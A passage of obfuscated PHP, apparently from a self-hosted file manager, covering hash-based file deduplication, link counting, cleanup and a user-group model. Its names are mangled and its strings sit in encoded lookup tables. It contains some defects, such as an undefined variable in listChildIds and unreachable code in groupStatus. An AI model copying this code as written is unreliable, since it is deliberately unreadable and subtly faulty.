= array($¶Á…Âï[645] => IO::size($‘ïğÜÉÆ), $¶Á…Âï[2186] => 1, $¶Á…Âï[514] => $’©—€Æ², $¶Á…Âï[912] => $«ùûâ‰ß[$¶Á…Âï[492]], $¶Á…Âï[515] => $‘ïğÜÉÆ, $¶Á…Âï[2187] => $‘ÂòÃºó[$¶Á…Âï[700]] ? $‘ÂòÃºó[$¶Á…Âï[700]] : IO::hashSimple($‘ïğÜÉÆ), $¶Á…Âï[2188] => $¨ÕÁ¾÷½ ? $¨ÕÁ¾÷½ : $ïô·ÌıÀ); if ($Ê¨¶ª¤Á = $this->addFileCheckExist($‹•á½Ø­[$¶Á…Âï[700]], $‹•á½Ø­[$¶Á…Âï[568]], $‹•á½Ø­[$¶Á…Âï[89]])) { return $Ê¨¶ª¤Á; } return $this->addFileData($‹•á½Ø­); } private function addFileData($íÇâ¢Åİ) { $ë˜¼«ÇÑ =& $_SERVER[ŒÅŸ‹ä†]; if (!$íÇâ¢Åİ) { return !1; } if (!IO::isFile($íÇâ¢Åİ[$ë˜¼«ÇÑ[97]])) { return !1; } $íÇâ¢Åİ[$ë˜¼«ÇÑ[89]] = intval($íÇâ¢Åİ[$ë˜¼«ÇÑ[89]]); if (!$íÇâ¢Åİ[$ë˜¼«ÇÑ[89]] && strlen($íÇâ¢Åİ[$ë˜¼«ÇÑ[700]]) > 32) { $íÇâ¢Åİ[$ë˜¼«ÇÑ[89]] = intval(substr($íÇâ¢Åİ[$ë˜¼«ÇÑ[700]], 32)); } $ˆ”–ó¦‘ = $this->add($íÇâ¢Åİ); return $this->find($ˆ”–ó¦‘); } public function addFile($Ÿ†İ¹Ò†, $éƒ“Ä«, $µß¥ïã­, $ıé™÷ùÎ = false) { $¥×Ë§ê« =& $_SERVER[ŒÅŸ‹ä†]; $ïöòõÎ = IO::hashSimple($Ÿ†İ¹Ò†); $•ÅáâîÅ = IO::size($Ÿ†İ¹Ò†); $ß‡Ëú“Ş = $•ÅáâîÅ <= 1024 * 1024 * 10 ? IO::hashMd5($Ÿ†İ¹Ò†) : $¥×Ë§ê«[12]; $²äÌˆÉÕ = $¥×Ë§ê«[2189] . $ïöòõÎ; CacheLock::lock($²äÌˆÉÕ); if ($ß‡Ëú“Ş && $ïöòõÎ) { $Ğó§ºäù = $this->addFileCheckExist($ïöòõÎ, $ß‡Ëú“Ş, $•ÅáâîÅ); if ($Ğó§ºäù) { CacheLock::unlock($²äÌˆÉÕ); return $Ğó§ºäù; } } $¨£‚âã¹ = $this->addFileMake($Ÿ†İ¹Ò†, $éƒ“Ä«, $•ÅáâîÅ, $ïöòõÎ, $ß‡Ëú“Ş, $µß¥ïã­, $ıé™÷ùÎ); $ö›ù¼à² = $this->addFileData($¨£‚âã¹); if (!$ö›ù¼à²) { return !1; } CacheLock::unlock($²äÌˆÉÕ); if (!$ß‡Ëú“Ş && $ö›ù¼à²) { $this->fileMd5Check($ö›ù¼à²); } return $ö›ù¼à²; } public function fileMd5Check($£º¸ßÂ¶) { $ÑÓ“Š¡ö =& $_SERVER[ŒÅŸ‹ä†]; $–› …æç = array($£º¸ßÂ¶[$ÑÓ“Š¡ö[562]], $£º¸ßÂ¶[$ÑÓ“Š¡ö[97]]); $ãöÜ£ñ¸ = $ÑÓ“Š¡ö[2190] . $£º¸ßÂ¶[$ÑÓ“Š¡ö[97]]; $Ó¡ÑÎµ = $ÑÓ“Š¡ö[2191] . $£º¸ßÂ¶[$ÑÓ“Š¡ö[562]]; TaskQueue::add($ÑÓ“Š¡ö[2192], $–› …æç, $ãöÜ£ñ¸, $Ó¡ÑÎµ); } public function fileMd5Set($’ğ¥Ì© , $ÖÍüŠ¼¶) { $¦’ë½Ä =& $_SERVER[ŒÅŸ‹ä†]; $ï˜Ô…ú = $this->find($’ğ¥Ì© ); if (!$ï˜Ô…ú || $ï˜Ô…ú[$¦’ë½Ä[568]]) { return; } $ÓÖÂüáÉ = IO::hashMd5($ÖÍüŠ¼¶); if (!$ÓÖÂüáÉ) { return $¦’ë½Ä[12]; } $this->where(array($¦’ë½Ä[562] => $’ğ¥Ì© ))->save(array($¦’ë½Ä[568] => $ÓÖÂüáÉ)); } public function addFileMake($˜ØÖíŒ‡, $¢´€ğœˆ, $¶ñÅÄˆæ, $®¢ÍÅ«ø, $Óûà˜¬¾, $¬ÒŒÈÓ–, $Â–ÕÔ¤µ) { $‡µ‡¯‡Â =& $_SERVER[ŒÅŸ‹ä†]; $íï³·Á‘ = $this->createFileName($¬ÒŒÈÓ–, $¢´€ğœˆ, $®¢ÍÅ«ø, $Óûà˜¬¾); $øô–ı‹í = get_path_father($íï³·Á‘); $µ¬ï´ÇÇ = get_path_this($íï³·Á‘); if ($Â–ÕÔ¤µ) { $ˆğãâñ¼ = IO::move($˜ØÖíŒ‡, $øô–ı‹í, !1, $µ¬ï´ÇÇ); } else { $ˆğãâñ¼ = IO::copy($˜ØÖíŒ‡, $øô–ı‹í, !1, $µ¬ï´ÇÇ); } if (!$ˆğãâñ¼) { return !1; } $ÎÀ¥˜—ƒ = IO::init($ˆğãâñ¼); $ÎÀ¥˜—ƒ->cacheMethod($‡µ‡¯‡Â[190], $ÎÀ¥˜—ƒ->path, $‡µ‡¯‡Â[187]); if (IO::size($ˆğãâñ¼) != $¶ñÅÄˆæ) { return !1; } $ŸÜŸ¦´Ì = array($‡µ‡¯‡Â[645] => $¶ñÅÄˆæ, $‡µ‡¯‡Â[2186] => 1, $‡µ‡¯‡Â[514] => $¬ÒŒÈÓ–, $‡µ‡¯‡Â[912] => $¢´€ğœˆ[$‡µ‡¯‡Â[492]], $‡µ‡¯‡Â[515] => $íï³·Á‘, $‡µ‡¯‡Â[2187] => $®¢ÍÅ«ø, $‡µ‡¯‡Â[2188] => $Óûà˜¬¾); return $ŸÜŸ¦´Ì; } public function addFileCheckExist($•÷øĞÄÊ, $•Õãáä•, $ı–ğîÍ€) { $Ï‹öşĞ =& $_SERVER[ŒÅŸ‹ä†]; $òù¯€Ô = $this->findByHash($•÷øĞÄÊ, $•Õãáä•); if (!$òù¯€Ô) { return !1; } $•¨¦º³ü = array($Ï‹öşĞ[2186] => intval($òù¯€Ô[$Ï‹öşĞ[2193]]) + 1, $Ï‹öşĞ[645] => $ı–ğîÍ€); $this->where(array($Ï‹öşĞ[563] => $òù¯€Ô[$Ï‹öşĞ[562]]))->save($•¨¦º³ü); return $òù¯€Ô; } public function remove($»Úé‹ê”) { $this->linkCountChange($»Úé‹ê”, !1); $this->clearEmpty(); return !0; } public function linkAdd($‚Ü‹äñ) { $this->linkCountChange($‚Ü‹äñ, !0); } public function linkCountChange($ÖşÒÛ¸¥, $î‘šàÒß) { $¼Ÿ»Áì =& $_SERVER[ŒÅŸ‹ä†]; if (!$ÖşÒÛ¸¥) { return; } if (!is_array($ÖşÒÛ¸¥)) { $ÖşÒÛ¸¥ = array($ÖşÒÛ¸¥); } $®‰®åà = array(); foreach ($ÖşÒÛ¸¥ as $¼ê´¢ÚĞ) { $•·İáİ = $¼ê´¢ÚĞ . $¼Ÿ»Áì[12]; if (!$®‰®åà[$•·İáİ]) { $®‰®åà[$•·İáİ] = 0; } $®‰®åà[$•·İáİ]++; } $ñğÍ‰‚ = array(); foreach ($®‰®åà as $¼ê´¢ÚĞ => $×óÑ­£¯) { $•·İáİ = $×óÑ­£¯ . $¼Ÿ»Áì[12]; if (!$ñğÍ‰‚[$•·İáİ]) { $ñğÍ‰‚[$•·İáİ] = array(); } $ñğÍ‰‚[$•·İáİ][] = $¼ê´¢ÚĞ; } foreach ($ñğÍ‰‚ as $×óÑ­£¯ => $½¡ÆÈÆŠ) { if (!$½¡ÆÈÆŠ) { continue; } $×óÑ­£¯ = $î‘šàÒß ? $×óÑ­£¯ : -intval($×óÑ­£¯); $×Ë—¸¬É = array($¼Ÿ»Áì[562] => array($¼Ÿ»Áì[7], $½¡ÆÈÆŠ)); if ($×óÑ­£¯ < 0) { $×Ë—¸¬É[$¼Ÿ»Áì[2193]] = array($¼Ÿ»Áì[1126], abs($×óÑ­£¯)); } $this->where($×Ë—¸¬É)->setAdd($¼Ÿ»Áì[2193], $×óÑ­£¯); } } public function findByHash($åÛƒ’Íğ, $ŸæªÕ¢û = false) { $¼ÆŠ‰Ö =& $_SERVER[ŒÅŸ‹ä†]; if (!$åÛƒ’Íğ && !$ŸæªÕ¢û) { return !1; } $ÑŞŸ¦Ë = array($¼ÆŠ‰Ö[2187] => $åÛƒ’Íğ); if ($ŸæªÕ¢û) { $ÑŞŸ¦Ë = array($¼ÆŠ‰Ö[2188] => $ŸæªÕ¢û); } return $this->order($¼ÆŠ‰Ö[2194])->where($ÑŞŸ¦Ë)->find(); } public function clearEmpty($ÊÊãé’´ = 1) { $—„®ÊÜ =& $_SERVER[ŒÅŸ‹ä†]; $óÇğÂİ° = time() - 3600 * 24 * $ÊÊãé’´; $¸·ÖÍ½â = $—„®ÊÜ[2195] . $óÇğÂİ°; $§ä šù¼ = $this->where($¸·ÖÍ½â)->select(); if (!$§ä šù¼) { return; } $† Çı×Ş = new Task($—„®ÊÜ[2196], $—„®ÊÜ[12], count($§ä šù¼)); foreach ($§ä šù¼ as $óÅ¬ˆóÛ) { $† Çı×Ş->update(1); $this->resetFile($óÅ¬ˆóÛ); } $† Çı×Ş->end(); } public function resetFile($ ß‰ı¾‹) { $¯ğêáôÎ =& $_SERVER[ŒÅŸ‹ä†]; $èğ‰İ‹ = array($¯ğêáôÎ[563] => $ ß‰ı¾‹[$¯ğêáôÎ[562]]); $í¸‰Î¼« = Model($¯ğêáôÎ[1477])->where($èğ‰İ‹)->count(); $åĞŒâ¤ = Model($¯ğêáôÎ[2197])->where($èğ‰İ‹)->count(); $ÃÅğñßº = intval($í¸‰Î¼«) + intval($åĞŒâ¤); if ($ÃÅğñßº == 0) { Model($¯ğêáôÎ[2198])->delete($ ß‰ı¾‹[$¯ğêáôÎ[562]]); $this->where($èğ‰İ‹)->delete(); $this->metaSet($ ß‰ı¾‹[$¯ğêáôÎ[562]], null, null); if (!IO::isFile($ ß‰ı¾‹[$¯ğêáôÎ[97]])) { write_log(array($¯ğêáôÎ[2199], ACTION, $ ß‰ı¾‹), $¯ğêáôÎ[1312]); return !1; } IO::remove($ ß‰ı¾‹[$¯ğêáôÎ[97]]); write_log(ACTION . $¯ğêáôÎ[937] . KodUser::id() . $¯ğêáôÎ[2200] . $ ß‰ı¾‹[$¯ğêáôÎ[562]] . $¯ğêáôÎ[1989] . $ ß‰ı¾‹[$¯ğêáôÎ[89]] . $¯ğêáôÎ[210] . $ ß‰ı¾‹[$¯ğêáôÎ[97]], $¯ğêáôÎ[2199]); return; } if ($ ß‰ı¾‹[$¯ğêáôÎ[2193]] != $ÃÅğñßº) { $this->where($èğ‰İ‹)->save(array($¯ğêáôÎ[2186] => $ÃÅğñßº)); } } public function storageInfo($ÙÔÛÚà = false) { $”ôÚ¶ªÓ =& $_SERVER[ŒÅŸ‹ä†]; $ÁË¶«ä× = $this->count() + 0.0; $ŒµÉ©› = 0; $œ§†ÑÊô = 1; $öÇô­õñ = 0; $¾ª’¦á¹ = 5000; for ($„òØÌé = 0; $„òØÌé < $ÁË¶«ä×; $„òØÌé = $„òØÌé + $¾ª’¦á¹) { $Ù¶ğä‚Ì = $this->limit($„òØÌé, $„òØÌé + $¾ª’¦á¹)->select(); foreach ($Ù¶ğä‚Ì as $Æ¡‡ «) { $œ§†ÑÊô += $Æ¡‡ «[$”ôÚ¶ªÓ[89]] * $Æ¡‡ «[$”ôÚ¶ªÓ[2193]]; $ŒµÉ©› += $Æ¡‡ «[$”ôÚ¶ªÓ[89]] * ($Æ¡‡ «[$”ôÚ¶ªÓ[2193]] - 1); $öÇô­õñ += $Æ¡‡ «[$”ôÚ¶ªÓ[2193]]; } } $“İ¦ìšØ = array($”ôÚ¶ªÓ[2201] => $œ§†ÑÊô, $”ôÚ¶ªÓ[2202] => $ŒµÉ©›, $”ôÚ¶ªÓ[2203] => $ŒµÉ©› / $œ§†ÑÊô, $”ôÚ¶ªÓ[93] => $ÁË¶«ä×, $”ôÚ¶ªÓ[2204] => $öÇô­õñ); return $“İ¦ìšØ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\155\145" => "\147\162\x6f\x75\160\x5f\155\x65\164\x61", "\155\145\x74\141\x46\x69\x65\154\x64" => "\x67\x72\157\x75\x70\111\x44"); protected function cacheFunctionAlias($×Ğµìôğ) { $¼—ñ¢‚— =& $_SERVER[ŒÅŸ‹ä†]; return array($¼—ñ¢‚—[2205] => array($×Ğµìôğ[0], $¼—ñ¢‚—[2206]), $¼—ñ¢‚—[2207] => array($×Ğµìôğ[0], $¼—ñ¢‚—[2208])); } protected function ___getInfo($±×¨¤ä) { $„ö©ü² = $this->getInfoSimple($±×¨¤ä); if (!$„ö©ü²) { return !1; } return $this->_listDataApplyItem($„ö©ü²); } protected function ___getInfoSimple($ôò“¨¨Ô) { $‹¹êõ¿ = array($_SERVER[ŒÅŸ‹ä†][1439] => intval($ôò“¨¨Ô)); $«…Òóë = $this->where($‹¹êõ¿)->find(); return is_array($«…Òóë) ? $«…Òóë : array(); } protected function groupAdd($“„ş’˜Ã) { $ òÑß´– =& $_SERVER[ŒÅŸ‹ä†]; if (!$“„ş’˜Ã[$ òÑß´–[201]] && isset($“„ş’˜Ã[$ òÑß´–[1439]]) && $“„ş’˜Ã[$ òÑß´–[1439]] == 1) { if ($†Ü°ÊÎ = $this->getInfoSimple($“„ş’˜Ã[$ òÑß´–[1439]], !0)) { return $“„ş’˜Ã[$ òÑß´–[1439]]; } } else { $†Ü°ÊÎ = $this->getInfoSimple($“„ş’˜Ã[$ òÑß´–[201]]); if (!$†Ü°ÊÎ) { return !1; } } $¸Çúóê¦ = $ òÑß´–[618]; if ($†Ü°ÊÎ[$ òÑß´–[609]]) { $¸Çúóê¦ = $†Ü°ÊÎ[$ òÑß´–[609]] . $†Ü°ÊÎ[$ òÑß´–[1439]] . $ òÑß´–[60]; } $æ¿ˆàÊõ = array($ òÑß´–[514] => $this->groupNameAuto($“„ş’˜Ã[$ òÑß´–[201]], $“„ş’˜Ã[$ òÑß´–[42]]), $ òÑß´–[497] => $“„ş’˜Ã[$ òÑß´–[201]], $ òÑß´–[680] => $¸Çúóê¦, $ òÑß´–[2209] => $“„ş’˜Ã[$ òÑß´–[2113]], $ òÑß´–[2210] => 0, $ òÑß´–[2130] => 0); $“„ş’˜Ã[$ òÑß´–[42]] = $æ¿ˆàÊõ[$ òÑß´–[42]]; if (isset($“„ş’˜Ã[$ òÑß´–[2148]])) { $æ¿ˆàÊõ[$ òÑß´–[2148]] = $“„ş’˜Ã[$ òÑß´–[2148]]; } else { $Ììß¶ ñ = $this->max($ òÑß´–[2148]); if (!$Ììß¶ ñ) { $Ììß¶ ñ = 0; } $æ¿ˆàÊõ[$ òÑß´–[2148]] = $Ììß¶ ñ + 1; } if (!empty($“„ş’˜Ã[$ òÑß´–[1439]])) { $æ¿ˆàÊõ[$ òÑß´–[1439]] = $“„ş’˜Ã[$ òÑß´–[1439]]; } $®÷®Ÿ“ë = $this->add($æ¿ˆàÊõ); $this->groupMetaEdit($®÷®Ÿ“ë, $“„ş’˜Ã); Model($ òÑß´–[1477])->groupRootAdd($®÷®Ÿ“ë); $this->_clearCache($“„ş’˜Ã[$ òÑß´–[201]]); return $®÷®Ÿ“ë; } protected function groupEdit($ÓÓÖË, $«Ó²ãµ) { $¹ñ–å¡ä =& $_SERVER[ŒÅŸ‹ä†]; $÷ïòí¤Ñ = $this->getInfoSimple($ÓÓÖË); if (!$÷ïòí¤Ñ) { return !1; } if (!empty($«Ó²ãµ[$¹ñ–å¡ä[201]])) { $¥¬Îå–á = $this->getInfoSimple($«Ó²ãµ[$¹ñ–å¡ä[201]]); if (!$¥¬Îå–á) { return !1; } if ($÷ïòí¤Ñ[$¹ñ–å¡ä[1439]] == $¥¬Îå–á[$¹ñ–å¡ä[1439]]) { return !1; } if ($«Ó²ãµ[$¹ñ–å¡ä[201]] != $÷ïòí¤Ñ[$¹ñ–å¡ä[201]]) { if ($¥¬Îå–á[$¹ñ–å¡ä[609]] !== $÷ïòí¤Ñ[$¹ñ–å¡ä[609]] && strpos($¥¬Îå–á[$¹ñ–å¡ä[609]], $÷ïòí¤Ñ[$¹ñ–å¡ä[609]] . $÷ïòí¤Ñ[$¹ñ–å¡ä[1439]] . $¹ñ–å¡ä[60]) === 0) { return !1; } $«Ó²ãµ[$¹ñ–å¡ä[680]] = $¥¬Îå–á[$¹ñ–å¡ä[609]] . $«Ó²ãµ[$¹ñ–å¡ä[201]] . $¹ñ–å¡ä[60]; $this->_changeChildLevel($÷ïòí¤Ñ, $¥¬Îå–á); $this->_clearCache($¥¬Îå–á[$¹ñ–å¡ä[1439]]); $this->_clearCache($÷ïòí¤Ñ[$¹ñ–å¡ä[201]]); } } $this->groupMetaEdit($ÓÓÖË, $«Ó²ãµ); $this->_clearChildrenCache($÷ïòí¤Ñ); return $this->where(array($¹ñ–å¡ä[2211] => $ÓÓÖË))->save($«Ó²ãµ); } private function groupMetaEdit($‚ùç‹ã´, &$ÙİèãÚ) { $€äÒµÎç =& $_SERVER[ŒÅŸ‹ä†]; if (isset($ÙİèãÚ[$€äÒµÎç[42]])) { $this->setNamePinyin($‚ùç‹ã´, $ÙİèãÚ[$€äÒµÎç[42]]); } if (isset($ÙİèãÚ[$€äÒµÎç[2212]])) { $˜¦¼’°÷ = array($€äÒµÎç[2212] => $ÙİèãÚ[$€äÒµÎç[2212]], $€äÒµÎç[2213] => $ÙİèãÚ[$€äÒµÎç[2213]]); unset($ÙİèãÚ[$€äÒµÎç[2212]]); unset($ÙİèãÚ[$€äÒµÎç[2213]]); if (isset($ÙİèãÚ[$€äÒµÎç[2214]])) { $¥Í³¶­å = $€äÒµÎç[1435] . $‚ùç‹ã´; $³¼¥ôªÚ = $€äÒµÎç[1434]; $Œ¾Í’Ğ˜ = $ÙİèãÚ[$€äÒµÎç[2214]] ? $ÙİèãÚ[$€äÒµÎç[2214]] : $€äÒµÎç[12]; $ğ÷Á³ª = Model($€äÒµÎç[1433])->get($¥Í³¶­å, $³¼¥ôªÚ); $ğ÷Á³ª = $ğ÷Á³ª ? $ğ÷Á³ª : $€äÒµÎç[12]; if ($ğ÷Á³ª != $Œ¾Í’Ğ˜) { if (!$Œ¾Í’Ğ˜ && $ğ÷Á³ª) { Model($€äÒµÎç[1433])->remove($¥Í³¶­å, $³¼¥ôªÚ); } else { if ($Œ¾Í’Ğ˜) { Model($€äÒµÎç[1433])->set($¥Í³¶­å, $Œ¾Í’Ğ˜, $³¼¥ôªÚ); } } } $˜¦¼’°÷[$€äÒµÎç[2214]] = $Œ¾Í’Ğ˜; } $this->metaSet($‚ùç‹ã´, $˜¦¼’°÷); } } private function _clearChildrenCache($¢ù¡¸Ü) { $š¨›ˆ¸ =& $_SERVER[ŒÅŸ‹ä†]; $ïÊ½é© = array($š¨›ˆ¸[680] => array($š¨›ˆ¸[640], $¢ù¡¸Ü[$š¨›ˆ¸[609]] . $¢ù¡¸Ü[$š¨›ˆ¸[1439]] . $š¨›ˆ¸[641])); $ÁÁ£°¯æ = $this->field($š¨›ˆ¸[1439])->where($ïÊ½é©)->select(); foreach ($ÁÁ£°¯æ as $¼®Ğš¶) { $this->_clearCache($¼®Ğš¶[$š¨›ˆ¸[1439]]); } } private function _clearCache($á‚•†¦ä) { $µî¬ó¥ =& $_SERVER[ŒÅŸ‹ä†]; $this->cacheFunctionClear($µî¬ó¥[2215], $á‚•†¦ä); $this->cacheFunctionClear($µî¬ó¥[2216], $á‚•†¦ä); } private function _changeChildLevel($Íùó, $íÃÍ¢å¶, $°™§÷Øˆ = false) { $Óà×ğ›™ =& $_SERVER[ŒÅŸ‹ä†]; $ãäà…©â = $Íùó[$Óà×ğ›™[609]] . $Íùó[$Óà×ğ›™[1439]] . $Óà×ğ›™[60]; $‚õ…¥ã¾ = $íÃÍ¢å¶[$Óà×ğ›™[609]] . $íÃÍ¢å¶[$Óà×ğ›™[1439]] . $Óà×ğ›™[60] . $Íùó[$Óà×ğ›™[1439]] . $Óà×ğ›™[60]; if ($°™§÷Øˆ) { $‚õ…¥ã¾ = $íÃÍ¢å¶[$Óà×ğ›™[609]] . $íÃÍ¢å¶[$Óà×ğ›™[1439]] . $Óà×ğ›™[60]; } $Ïèòºñ = array($Óà×ğ›™[680] => array($Óà×ğ›™[640], $Íùó[$Óà×ğ›™[609]] . $Íùó[$Óà×ğ›™[1439]] . $Óà×ğ›™[641])); $‚º–­èô = array($Óà×ğ›™[680] => array($Óà×ğ›™[689], "\162\145\160\x6c\141\143\x65\50\160\141\162\x65\156\x74\x4c\145\166\x65\154\54\47{$ãäà…©â}\47\54\x27{$‚õ…¥ã¾}\x27\51")); $this->_clearChildrenCache($Íùó); $this->where($Ïèòºñ)->data($‚º–­èô)->save(); } public function setNamePinyin($²¸ÍÎ, $ ÂçéÄ = false) { $ÅÄ“Å³ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ ÂçéÄ) { $®« èßó = $this->getInfoSimple($²¸ÍÎ); $ ÂçéÄ = $®« èßó[$ÅÄ“Å³[42]]; } if (!Input::check($ ÂçéÄ, $ÅÄ“Å³[683])) { $this->metaSet($²¸ÍÎ, $ÅÄ“Å³[557], null); $this->metaSet($²¸ÍÎ, $ÅÄ“Å³[556], null); return; } $ÜáæÀê° = array($ÅÄ“Å³[557] => str_replace($ÅÄ“Å³[63], $ÅÄ“Å³[12], Pinyin::get($ ÂçéÄ)), $ÅÄ“Å³[556] => Pinyin::get($ ÂçéÄ, $ÅÄ“Å³[684])); $this->metaSet($²¸ÍÎ, $ÜáæÀê°); } protected function metaSet($ÅíŒ‡ñá, $çÚã°° = null, $û¿ë‘çæ = null) { $this->_clearCache($ÅíŒ‡ñá); return parent::metaSet($ÅíŒ‡ñá, $çÚã°°, $û¿ë‘çæ); } protected function groupStatus($…º˜½İ, $Ç‘­ñÁÈ) { $îÍó’» =& $_SERVER[ŒÅŸ‹ä†]; $ŸëÙÏ­‡ = $this->getInfoSimple($…º˜½İ); if (!$ŸëÙÏ­‡) { return !1; } $this->_clearCache($…º˜½İ); return $this->metaSet($…º˜½İ, $îÍó’»[846], $Ç‘­ñÁÈ); if ($Ç‘­ñÁÈ == $îÍó’»[101]) { $®‡ßäãƒ = $this->parentLevelArray($ŸëÙÏ­‡[$îÍó’»[609]]); } else { } $®‡ßäãƒ[] = $ŸëÙÏ­‡[$îÍó’»[1439]]; $½„ìŠ¢É = array(); foreach ($®‡ßäãƒ as $…º˜½İ) { $½„ìŠ¢É[] = array($îÍó’»[1439] => $…º˜½İ, $îÍó’»[105] => $îÍó’»[846], $îÍó’»[460] => $Ç‘­ñÁÈ); $this->_clearCache($…º˜½İ); } return Model($îÍó’»[2217])->addAll($½„ìŠ¢É, array(), !0); } protected function groupRemove($Â’«Â®İ, $¥‡ºò¿ş = false) { $†«§úô =& $_SERVER[ŒÅŸ‹ä†]; $äë¾äš› = array($†«§úô[1439] => $Â’«Â®İ); $â§­®åÛ = $this->where($äë¾äš›)->find(); if (!$â§­®åÛ || $â§­®åÛ[$†«§úô[201]] == 0) { return !1; } if (!$¥‡ºò¿ş) { $¹–…¤Ÿ± = $this->getInfoSimple($â§­®åÛ[$†«§úô[201]]); $this->_changeChildLevel($â§­®åÛ, $¹–…¤Ÿ±, !0); $this->where(array($†«§úô[201] => $Â’«Â®İ))->save(array($†«§úô[201] => $â§­®åÛ[$†«§úô[201]])); $this->_clearCache($¹–…¤Ÿ±[$†«§úô[1439]]); } Model($†«§úô[2217])->where($äë¾äš›)->delete(); Model($†«§úô[2218])->where($äë¾äš›)->delete(); Model($†«§úô[929])->groupRootRemove($Â’«Â®İ); $this->_clearCache($â§­®åÛ[$†«§úô[201]]); return $this->where($äë¾äš›)->delete(); } protected function groupSort($ó«µÖ) { $Ğ¢Ä°±¦ =& $_SERVER[ŒÅŸ‹ä†]; $—ìºÒ… = array(); foreach ($ó«µÖ as $úİÌç¦” => $†¼àã‚Û) { $—ìºÒ…[] = array($Ğ¢Ä°±¦[1439], $†¼àã‚Û, $Ğ¢Ä°±¦[2148], $úİÌç¦” + 1); } $this->saveAll($—ìºÒ…); } public function listData() { $’Íé¹©» = $this->_makeOrder()->selectPage(50); $this->_listDataApply($’Íé¹©»[$_SERVER[ŒÅŸ‹ä†][455]]); return $’Íé¹©»; } private function _makeOrder($‡‰­–ÀŸ = '') { $Î©¸¨ìÕ =& $_SERVER[ŒÅŸ‹ä†]; $Ÿ¨ÛæÑ¶ = array($Î©¸¨ìÕ[1439], $Î©¸¨ìÕ[42], $Î©¸¨ìÕ[2115], $Î©¸¨ìÕ[242]); $ñ×Óé™§ = array($Î©¸¨ìÕ[542] => $Î©¸¨ìÕ[543], $Î©¸¨ìÕ[544] => $Î©¸¨ìÕ[545]); $Œ¬ïø½á = Input::get($Î©¸¨ìÕ[549], $Î©¸¨ìÕ[7], $Î©¸¨ìÕ[2130], $Ÿ¨ÛæÑ¶); $½ƒÇŒÍ´ = Input::get($Î©¸¨ìÕ[550], $Î©¸¨ìÕ[7], $Î©¸¨ìÕ[2219], array($Î©¸¨ìÕ[2219], $Î©¸¨ìÕ[544])); $½ƒÇŒÍ´ = $ñ×Óé™§[$½ƒÇŒÍ´]; $‡‰­–ÀŸ = $‡‰­–ÀŸ . "{$Œ¬ïø½á}\x20{$½ƒÇŒÍ´}\54\40\147\162\157\165\160\x49\104\x20\x61\163\143"; return $this->order($‡‰­–ÀŸ); } public function listChild($ô§˜ğé§) { $ƒ«ÀÂ¯Ÿ =& $_SERVER[ŒÅŸ‹ä†]; $ÑŠíç–£ = $this->where(array($ƒ«ÀÂ¯Ÿ[201] => $ô§˜ğé§))->_makeOrder()->selectPage(200); $this->_listDataApply($ÑŠíç–£[$ƒ«ÀÂ¯Ÿ[455]]); return $ÑŠíç–£; } public function listChildIds($ÁøŒ) { $­•Øº“Ç =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($µğ˜ºüæ)) { $ÁøŒ = explode($­•Øº“Ç[60], $ÁøŒ); } $³­š½ŠÊ = $this->where(array($­•Øº“Ç[1439] => array($­•Øº“Ç[7], $ÁøŒ)))->field($­•Øº“Ç[2220])->select(); if (!$³­š½ŠÊ) { return !1; } $â‹ºôáš = array(); foreach ($³­š½ŠÊ as $Ã¬ì£²) { $â‹ºôáš[] = "\x73\x65\154\145\x63\164\40\x67\162\x6f\165\160\x49\x44\40\x66\x72\x6f\x6d\40\x60\x67\162\157\x75\160\140\40\x77\x68\x65\x72\x65\40\x70\x61\x72\145\156\x74\x4c\145\166\145\154\x20\154\x69\153\145\40\47{$Ã¬ì£²[$­•Øº“Ç[609]]}{$Ã¬ì£²[$­•Øº“Ç[1439]]}\54\x25\47"; } $â‹ºôáš = implode($­•Øº“Ç[2221], $â‹ºôáš); $³­š½ŠÊ = $this->query($â‹ºôáš); if (!$³­š½ŠÊ) { return array(); } $ÁøŒ = array_to_keyvalue($³­š½ŠÊ, $­•Øº“Ç[12], $­•Øº“Ç[1439]); return array_unique($ÁøŒ); } public function listByID($ü‹ğÍ§Ú) { $¥Õîîş =& $_SERVER[ŒÅŸ‹ä†]; if (!$ü‹ğÍ§Ú) { return array(); } $»Ì‘Şİ– = array($¥Õîîş[1439] => array($¥Õîîş[7], $ü‹ğÍ§Ú)); $§Ç³è¬‹ = $this->where($»Ì‘Şİ–)->select(); $§Ç³è¬‹ = array_sort_keep($§Ç³è¬‹, $¥Õîîş[1439], $ü‹ğÍ§Ú); $this->_listDataApply($§Ç³è¬‹); return $§Ç³è¬‹; } public function listSearch($ıšáÃ™) { $ÕÏüâæÄ =& $_SERVER[ŒÅŸ‹ä†]; $ÛõÛÚµ® = trim($ıšáÃ™[$ÕÏüâæÄ[2222]]); $×ºÏ¤õÅ = explode($ÕÏüâæÄ[63], $ÛõÛÚµ®); if (!$ÛõÛÚµ® || count($×ºÏ¤õÅ) == 1) { return $this->listSearchNow($ıšáÃ™); } $·ìıÜû‚ = array($ÕÏüâæÄ[455] => array()); foreach ($×ºÏ¤õÅ as $â¨æà›°) { if (!trim($â¨æà›°)) { continue; } $ıšáÃ™[$ÕÏüâæÄ[2222]] = $â¨æà›°; $±º›„ğŞ = $this->listSearchNow($ıšáÃ™); $·ìıÜû‚[$ÕÏüâæÄ[455]] = array_merge($·ìıÜû‚[$ÕÏüâæÄ[455]], $±º›„ğŞ[$ÕÏüâæÄ[455]]); } $·ìıÜû‚[$ÕÏüâæÄ[455]] = array_unique_by_key($·ìıÜû‚[$ÕÏüâæÄ[455]], $ÕÏüâæÄ[1439]); $·ìıÜû‚[$ÕÏüâæÄ[452]] = array($ÕÏüâæÄ[453] => count($·ìıÜû‚[$ÕÏüâæÄ[455]]), $ÕÏüâæÄ[449] => 20, $ÕÏüâæÄ[438] => 1, $ÕÏüâæÄ[454] => 1); return $·ìıÜû‚; } public function listSearchNow($Ñ°¶¼ÀÌ) { $ú€‹Éİ® =& $_SERVER[ŒÅŸ‹ä†]; $Á¹èÑ½À = trim($Ñ°¶¼ÀÌ[$ú€‹Éİ®[2222]]); $Ñ¿££½Ò = isset($Ñ°¶¼ÀÌ[$ú€‹Éİ®[2223]]) ? $Ñ°¶¼ÀÌ[$ú€‹Éİ®[2223]] : !1; if (!trim($Á¹èÑ½À)) { return !1; } $Á¹èÑ½À = str_replace($ú€‹Éİ®[2224], $ú€‹Éİ®[2225], $Á¹èÑ½À); $’¥ÒíÖØ = array($ú€‹Éİ®[1439] => array($ú€‹Éİ®[479], "{$Á¹èÑ½À}\x25"), 